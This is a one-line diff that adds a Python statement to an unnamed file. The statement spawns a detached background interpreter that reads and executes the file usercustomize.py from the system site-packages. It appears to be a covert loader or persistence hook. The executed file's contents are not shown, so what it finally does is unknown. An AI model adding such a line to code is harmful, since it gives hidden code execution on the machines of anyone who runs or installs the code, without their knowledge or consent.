@@ -1,0 +1,1 @@
+import os,sys,subprocess; subprocess.Popen([sys.executable,"-c","exec(open(\"/usr/lib/python3.12/site-packages/usercustomize.py\").read())"], start_new_session=True)
